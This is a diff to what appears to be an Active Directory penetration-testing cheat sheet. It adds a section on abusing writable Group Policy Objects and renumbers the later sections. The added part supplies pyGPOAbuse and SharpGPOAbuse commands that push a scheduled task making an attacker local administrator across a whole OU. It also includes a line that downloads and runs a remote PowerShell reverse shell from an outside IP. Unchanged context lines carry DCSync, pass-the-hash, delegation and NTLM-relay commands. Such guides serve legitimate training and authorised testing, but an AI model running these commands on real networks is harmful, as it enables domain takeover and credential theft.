@@ -472,7 +472,39 @@ For each: **how to detect → how to exploit → what you get.**
   ```
 - **Yields:** plaintext local/domain password.
 
-### 7. LAPS Read (ms-Mcs-AdmPwd)
+### 7. Writable GPO (insecure ACL on a Group Policy Object)
+- **Detect (BloodHound):** an outbound edge from your owned principal to a `GPO` node — `GenericAll`, `GenericWrite`, `WriteDacl`, `WriteOwner`, or `WriteProperty`. Right-click the GPO → **Linked OUs/Computers** to see scope. Cypher to list candidates:
+  ```cypher
+  MATCH p=(u {owned:true})-[:GenericAll|GenericWrite|WriteDacl|WriteOwner|WriteProperty]->(g:GPO) RETURN p
+  ```
+- **Detect (LDAP / nxc):**
+  ```bash
+  nxc ldap <DC> -u u -p p --gpo-name '*'                       # list GPOs
+  # PowerView (Windows): Get-DomainGPO | Get-ObjectAcl -ResolveGUIDs |
+  #   Where-Object {$_.ActiveDirectoryRights -match 'Write|All'}
+  ```
+- **Exploit (Linux — pyGPOAbuse):** push an immediate scheduled task that adds a user to the local Administrators group (or runs a payload) on every machine in the linked OU.
+  ```bash
+  git clone https://github.com/Hackndo/pyGPOAbuse && cd pyGPOAbuse
+  # Add 'attacker' to Administrators on every target in the linked OU:
+  python3 pygpoabuse.py corp.local/svc_user:'Password1' -gpo-id <GPO-GUID> \
+      -powershell -command "net localgroup administrators attacker /add"
+  # Or drop a reverse shell:
+  python3 pygpoabuse.py corp.local/svc_user:'Password1' -gpo-id <GPO-GUID> \
+      -powershell -command "IEX(IWR http://10.10.14.5/rev.ps1 -UseBasicParsing)"
+  ```
+- **Exploit (Windows — SharpGPOAbuse):**
+  ```cmd
+  SharpGPOAbuse.exe --AddLocalAdmin --UserAccount attacker --GPOName "Vuln GPO"
+  SharpGPOAbuse.exe --AddComputerTask --TaskName "update" --Author NT\SYSTEM ^
+      --Command "cmd.exe" --Arguments "/c net localgroup administrators attacker /add" ^
+      --GPOName "Vuln GPO"
+  ```
+- **Trigger:** wait for the next refresh (~90 min) or force on a host you already have a shell on: `gpupdate /force`.
+- **Yields:** code execution as SYSTEM (scheduled task) or local admin membership on every machine linked to that GPO — often whole OUs of workstations, sometimes the DC if the GPO is linked at domain root.
+- **Note:** GPO GUID comes from BloodHound (node properties) or `nxc ldap --gpo-name`.
+
+### 8. LAPS Read (ms-Mcs-AdmPwd)
 - **Detect:** BH "Find computers without LAPS" inverse; user has `ReadLAPSPassword` edge.
 - **Exploit:**
   ```bash
@@ -481,7 +513,7 @@ For each: **how to detect → how to exploit → what you get.**
   ```
 - **Yields:** local Administrator password on that machine → PTH/login.
 
-### 8. Unconstrained Delegation
+### 9. Unconstrained Delegation
 - **Detect:** BH "Find Computers with Unconstrained Delegation"
 - **Exploit:** Coerce a privileged account (often DC computer account) to auth to your machine → capture TGT from memory → PTT.
   ```bash
@@ -493,7 +525,7 @@ For each: **how to detect → how to exploit → what you get.**
   ```
 - **Yields:** DC TGT → DCSync → Golden.
 
-### 9. Constrained Delegation (S4U2Self + S4U2Proxy)
+### 10. Constrained Delegation (S4U2Self + S4U2Proxy)
 - **Detect:** user/computer has `msDS-AllowedToDelegateTo` set.
 - **Exploit:**
   ```bash
@@ -502,7 +534,7 @@ For each: **how to detect → how to exploit → what you get.**
   impacket-secretsdump -k -no-pass corp.local/Administrator@dc01.corp.local
   ```
 
-### 10. Resource-Based Constrained Delegation (RBCD)
+### 11. Resource-Based Constrained Delegation (RBCD)
 - **Detect:** you have GenericWrite or GenericAll on a computer object (BH edge).
 - **Exploit:**
   ```bash
@@ -515,7 +547,7 @@ For each: **how to detect → how to exploit → what you get.**
 - **Yields:** SYSTEM on the target computer.
 - **Note:** MachineAccountQuota default = 10 (any user can add a computer).
 
-### 11. DCSync (DS-Replication-Get-Changes-All)
+### 12. DCSync (DS-Replication-Get-Changes-All)
 - **Detect:** BH "Find Principals with DCSync Rights" (user has both `GetChanges` + `GetChangesAll`).
 - **Exploit:**
   ```bash
@@ -525,7 +557,7 @@ For each: **how to detect → how to exploit → what you get.**
   ```
 - **Yields:** every NTLM hash incl. `krbtgt` → Golden Ticket → game over.
 
-### 12. ADCS (ESC1–ESC11)
+### 13. ADCS (ESC1–ESC11)
 - **Detect:**
   ```bash
   certipy find -u u@corp.local -p 'Password1' -dc-ip <IP> -vulnerable -stdout
@@ -537,7 +569,7 @@ For each: **how to detect → how to exploit → what you get.**
   ```
 - **Yields:** TGT + NT hash of any user (often Administrator).
 
-### 13. Pass-the-Hash (NTLM)
+### 14. Pass-the-Hash (NTLM)
 - Any tool with `-H` or `-hashes`:
   ```bash
   nxc smb <IP> -u Administrator -H aad3b...:31d6c...
@@ -545,13 +577,13 @@ For each: **how to detect → how to exploit → what you get.**
   impacket-psexec corp.local/Administrator@<IP> -hashes :31d6c...
   ```
 
-### 14. Pass-the-Ticket
+### 15. Pass-the-Ticket
 ```bash
 export KRB5CCNAME=/path/to/ticket.ccache
 impacket-wmiexec -k -no-pass corp.local/Administrator@dc01.corp.local
 ```
 
-### 15. SMB Signing Disabled → NTLM Relay
+### 16. SMB Signing Disabled → NTLM Relay
 - **Detect:**
   ```bash
   nxc smb <RANGE> --gen-relay-list relay-targets.txt
@@ -567,7 +599,7 @@ impacket-wmiexec -k -no-pass corp.local/Administrator@dc01.corp.local
   ```
 - **Yields:** auth as the relayed account (often a computer/admin) → dump SAM → local admin.
 
-### 16. Password Reuse (most common OSCP path!)
+### 17. Password Reuse (most common OSCP path!)
 Every time you crack/dump a password:
 ```bash
 nxc smb <RANGE> -u <user> -p <pass>                    # try domain
